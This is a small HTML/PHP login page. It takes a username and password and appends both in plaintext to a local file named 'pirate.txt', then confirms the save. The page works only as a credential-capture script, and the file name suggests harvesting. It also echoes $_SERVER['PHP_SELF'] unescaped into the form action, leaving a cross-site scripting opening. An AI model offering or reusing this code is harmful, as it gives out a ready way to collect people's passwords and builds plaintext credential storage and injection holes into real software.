<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Form</title>
</head>
<body>
    <h2>Login Form</h2>
    <form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="POST">
        <label for="username">Username:</label><br>
        <input type="text" id="username" name="username" required><br><br>
        
        <label for="password">Password:</label><br>
        <input type="password" id="password" name="password" required><br><br>
        
        <input type="submit" value="Submit">
    </form>

    <?php
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        // Get the entered username and password from the form
        $username = $_POST["username"];
        $password = $_POST["password"];

        // Path to the file where you want to save the data (change accordingly)
        $file_path = "C:\pirate\pirate.txt";

        // Write the username and password to the file
        $data = "Username: " . $username . "\nPassword: " . $password . "\n\n";
        if (file_put_contents($file_path, $data, FILE_APPEND)) {
            echo "Login details saved successfully.";
        } else {
            echo "Failed to save login details.";
        }
    }
    ?>
</body>
</html>
